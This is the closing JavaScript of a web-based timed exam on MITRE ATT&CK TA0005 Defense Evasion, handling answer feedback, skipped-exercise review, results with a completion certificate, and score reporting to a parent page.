    S.answered[ex.id] = { credit: creditFinal, hint: hintUsed };
    delete S.skipped[ex.id];
    S.cur.graded = true;
    S.cur.credit = creditFinal;
    S.cur.items = items;
    S.cur.N = N;
    S.cur.answerHtml = answerHtml;
    S.cur.widget.lock();
    renderScore();
    updateHeader();
    renderFeedback();
  }

  function renderFeedback() {
    var fb = $id("fb");
    if (!fb || !S.cur) return;
    var credit = S.cur.credit, hintUsed = !!(S.hints[S.cur.ex.id] && S.hints[S.cur.ex.id].used);
    var label, cls, icon;
    if (credit >= 0.999) { label = "CORRECT"; cls = "fb-ok"; icon = "&#10003;"; }
    else if (credit > 0) { label = "PARTIALLY CORRECT"; cls = "fb-part"; icon = "&#10003;"; }
    else { label = "INCORRECT"; cls = "fb-no"; icon = "&#10007;"; }
    fb.style.display = "";
    fb.innerHTML = "";
    var head = h("div", "fbhead " + cls);
    head.setAttribute("role", "status");
    head.innerHTML = '<span class="fbicon">' + icon + "</span> " + label +
      (hintUsed ? ' <span class="dim">(hint used: &minus;0.10 credit)</span>' : "");
    fb.appendChild(head);
    var body = h("div", "fbbody");
    if (S.cur.items.length > 1) {
      var Hc = 0; S.cur.items.forEach(function (it) { if (it.st === "ok") Hc++; });
      body.appendChild(h("div", "fbcredit", "credit " + credit.toFixed(2) + " &mdash; " + Hc + "/" + S.cur.N + " items &mdash; scoring: (H &minus; W) / N"));
      S.cur.items.forEach(function (it) {
        var word = it.st === "ok" ? "&#10003; Correct" : it.st === "wrong" ? "&#10007; Wrong" : "&#9675; Missed";
        var cls2 = it.st;
        body.appendChild(h("div", "iline", '<span class="ist ' + cls2 + '">' + word + "</span><span>" + it.h + "</span>"));
      });
    } else if (S.cur.items.length === 1) {
      body.appendChild(h("div", "iline", '<span class="ist ' + (credit >= 0.999 ? "ok" : credit > 0 ? "part" : "wrong") + '">' + (credit >= 0.999 ? "&#10003; Correct" : "&#10007; Incorrect") + "</span><span>" + S.cur.items[0].h + "</span>"));
    }
    body.appendChild(h("h3", null, "Correct answer"));
    body.appendChild(h("div", null, S.cur.answerHtml));
    body.appendChild(h("div", "fbexplain", S.cur.ex.explain));
    body.appendChild(h("div", "fbstudy", "What to study next: " + S.cur.ex.study));
    fb.appendChild(body);
    var nxt = $id("b-next");
    if (nxt) { nxt.disabled = false; }
    var chk = $id("b-check");
    if (chk) chk.disabled = true;
    smoothScroll(fb);
  }

  /* ---------- next / skip / review ---------- */
  function onNext() {
    if (!S.cur || !S.cur.graded) return;
    if (S.tm.state === "PAUSED_AUTO_CHECK") setTimerState("RUNNING");
    if (S.cur.fromReview) { renderReview(); return; }
    S.pos++;
    if (S.pos < S.order.length) renderCurrent();
    else toReviewOrResults();
  }

  function onSkip() {
    if (S.screen !== "exam" || !S.cur || S.cur.graded) return;
    S.skipped[S.cur.ex.id] = true;
    /* Skip never triggers the auto-pause; the timer keeps running. */
    if (S.cur.fromReview) { renderReview(); return; }
    S.pos++;
    if (S.pos < S.order.length) renderCurrent();
    else toReviewOrResults();
  }

  function renderReview() {
    S.screen = "review";
    var root = $id("app");
    root.innerHTML = "";
    root.appendChild(makeHeader());
    renderTimer(); renderScore();
    /* No current exercise here: Skip and Hint have nothing to act on, so they
       are disabled. Pause (a real break) stays available. */
    var skipB = $id("b-skip"); if (skipB) skipB.disabled = true;
    var hintB = $id("b-hint"); if (hintB) hintB.disabled = true;
    var cnt = $id("h-count"); if (cnt) cnt.textContent = "Review";
    var card = h("div", "excard");
    card.appendChild(h("h2", null, "Review skipped exercises"));
    var keys = Object.keys(S.skipped);
    if (!keys.length) {
      card.appendChild(h("p", null, "No skipped exercises are waiting. You can submit the exam now."));
    } else {
      card.appendChild(h("p", null, "These exercises were skipped and not answered. You can go back to any of them while the timer still has time. The timer keeps running on this screen."));
      var ul = h("ul", "skiplist");
      keys.forEach(function (k) {
        var ex = byId(k);
        var li = h("li", "skipitem");
        li.innerHTML = '<span class="skiptxt">' + (ex ? ex.summary : esc(k)) + "</span>";
        var b = h("button", "btn primary");
        b.type = "button"; b.textContent = "Answer";
        b.addEventListener("click", function () {
          var p = posOf(k);
          if (p < 0) return;
          S.pos = p;
          S.reviewFlag = true;
          S.screen = "exam";
          renderExamFrame();
          renderCurrent();
        });
        li.appendChild(b);
        ul.appendChild(li);
      });
      card.appendChild(ul);
    }
    var sb = h("button", "btn primary big");
    sb.type = "button"; sb.textContent = "Final Submit";
    sb.addEventListener("click", function () { showResults(null); });
    card.appendChild(sb);
    root.appendChild(card);
    window.scrollTo(0, 0);
  }

  /* ---------- results + reporting ---------- */
  function reportScore(creditSum, answeredCount) {
    var percent = answeredCount > 0 ? Math.round((creditSum / answeredCount) * 100) : 0;
    try {
      parent.postMessage({
        type: "CYBERPULSE_SCORE",
        topicId: CFG.topicId,
        batch: CFG.batch,
        score: Math.round(creditSum),
        total: answeredCount,
        percent: percent,
        passed: percent >= CFG.passMark
      }, location.origin);
    } catch (e) { /* opened directly, not inside the site: nothing to report to */ }
  }

  function showResults(note) {
    if (S.screen === "results") return;
    setTimerState("ENDED");
    S.screen = "results";
    if (S.tm.iv) { clearInterval(S.tm.iv); S.tm.iv = null; } /* no ticks after the exam ends */
    var root = $id("app");
    root.innerHTML = "";
    var ids = Object.keys(S.answered);
    var sum = 0;
    ids.forEach(function (k) { sum += S.answered[k].credit; });
    var fully = 0, part = 0, wrong = 0, psum = 0;
    ids.forEach(function (k) {
      var c = S.answered[k].credit;
      if (c >= 0.999) fully++;
      else if (c > 0) { part++; psum += c; }
      else wrong++;
    });
    var skippedN = Object.keys(S.skipped).length;
    var total = ids.length;
    var pct = total ? Math.round((sum / total) * 100) : 0;
    var pass = pct >= CFG.passMark;

    var hero = h("div", "res-hero");
    hero.innerHTML = "<h2>Results &mdash; TA0005 Defense Evasion, " + CFG.sevName + " tier</h2>" +
      '<div class="res-score">' + (Math.round(sum * 10) / 10).toFixed(1) + " / " + total + "</div>" +
      '<div class="res-pct">' + pct + "% &mdash; pass mark " + CFG.passMark + "%</div>" +
      (note ? '<p class="dim">' + esc(note) + "</p>" : "");
    root.appendChild(hero);

    if (pass) {
      var name = S.user.username || "Learner";
      var cert = h("div", "cert");
      cert.innerHTML = '<div class="ctitle">&#10003; PASSED &mdash; Certificate of completion</div>' +
        '<div class="cname">' + esc(name) + "</div>" +
        "<p>MITRE ATT&amp;CK <strong>TA0005 &mdash; Defense Evasion</strong> &middot; " + CFG.sevName + " tier &middot; score " + pct + "%</p>" +
        '<p class="dim">You can read attack goals, spot common evasion moves, and name the right responses at this level.</p>';
      root.appendChild(cert);
    } else {
      var fail = h("div", "failpanel");
      fail.innerHTML = "<h2>&#10007; Not passed yet</h2><p>You scored " + pct + "% and the pass mark is " + CFG.passMark + "%. You must retake the exam. Read the feedback in each exercise again, then try once more.</p>";
      var rk = h("button", "btn primary big");
      rk.type = "button"; rk.textContent = "Retake Exam";
      rk.addEventListener("click", startExam);
      fail.appendChild(rk);
      root.appendChild(fail);
    }

    var grid = h("div", "resgrid");
    function rc(num, lbl) { return '<div class="rescard"><div class="num">' + num + '</div><div class="lbl">' + lbl + "</div></div>"; }
    grid.innerHTML =
      rc(fully, "&#10003; Fully correct") +
      rc(part, "&#10003; Partially correct" + (part ? " &mdash; avg " + (Math.round((psum / part) * 100) / 100).toFixed(2) : "")) +
      rc(wrong, "&#10007; Fully incorrect") +
      rc(skippedN, "&#9888; Skipped, never answered (excluded)");
    root.appendChild(grid);

    var pl = h("p", "pauselog");
    pl.innerHTML = "Time on pauses: manual breaks " + Math.round(S.tm.manualMs / 1000) + " s; feedback review (auto-pause after Check) " + Math.round(S.tm.autoMs / 1000) + " s. Attempt #" + S.attempt + ".";
    root.appendChild(pl);

    if (!S.reported) {
      S.reported = true;
      reportScore(sum, total);
    }
    window.scrollTo(0, 0);
  }

  /* ---------- site handshake (optional; exam works with no handshake at all) ---------- */
  window.addEventListener("message", function (ev) {
    var d = ev && ev.data;
    if (!d) return;
    if (d.type === "CYBERPULSE_INIT" || d.type === "CYBERMASTERY_INIT") {
      S.user.username = String(d.username || "");
      S.user.country = String(d.country || "");
      S.user.theme = String(d.theme || "");
      S.user.locale = String(d.locale || "");
      /* This file ships a dark theme by default, which matches the site's
         dark theme; no style swap is needed for the supported 'dark' value. */
    }
  });

  /* ---------- boot ---------- */
  renderIntro();
})();


</script>
</body>
</html>
